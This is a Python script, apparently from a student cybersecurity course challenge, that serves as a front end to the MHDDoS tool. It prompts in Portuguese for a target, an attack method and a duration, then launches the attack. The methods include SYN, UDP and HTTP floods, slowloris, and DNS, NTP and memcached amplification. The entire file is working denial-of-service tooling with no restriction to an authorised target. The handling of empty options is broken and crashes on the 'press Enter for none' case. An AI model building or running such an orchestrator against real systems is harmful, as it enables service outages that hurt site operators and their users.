import subprocess
import time
import threading

MHDDoS_PATH = "/home/blast/Desktop/Course/FIAP/Semestre_1/Challenge/Minions (Lins FIAP)/DDoS/DDoS_orchestrator/MHDDoS"

def list_attack_methods():
    attack_methods = [
        "slowloris",
        "http-flood",
        "tcp-flood",
        "udp-flood",
        "syn-flood",
        "dns-amplification",
        "memcached-flood",
        "ntp-amplification",
        "ssdp-flood",
        "icmp-flood",
    ]
    return attack_methods

def start_ddos_attack(target, attack_method, duration, options=None):
    print(f"Iniciando ataque DDoS usando {attack_method} ao alvo: {target} por {duration} segundos.")
    command = ["python3", f"{MHDDoS_PATH}/start.py", attack_method, target]

    if options:
        command.extend(options)

    process = subprocess.Popen(command)

    def terminate_attack():
        input("Pressione Enter para encerrar o ataque imediatamente.\n")
        process.terminate()
        process.wait()
        print(f"Ataque DDoS usando {attack_method} ao alvo: {target} foi encerrado prematuramente.")


    terminate_thread = threading.Thread(target=terminate_attack)
    terminate_thread.start()

    try:
        time.sleep(duration)
    finally:
        if process.poll() is None: 
            process.terminate()
            process.wait()
            print(f"Ataque DDoS usando {attack_method} ao alvo: {target} finalizado.")

def main():
    attack_methods = list_attack_methods()
    print("Métodos de ataque disponíveis:")
    for method in attack_methods:
        print(f" - {method}")

    target = input("Digite o alvo do ataque (e.g., http://example.com): ")
    attack_method = input(f"Escolha o método de ataque ({', '.join(attack_methods)}): ")
    duration = int(input("Digite a duração do ataque em segundos: "))
    options = input("Digite opções adicionais (separadas por espaço) ou pressione Enter para nenhuma: ").split()

    if not options[0]:
        options = None

    start_ddos_attack(target, attack_method, duration, options)

if __name__ == "__main__":
    main()
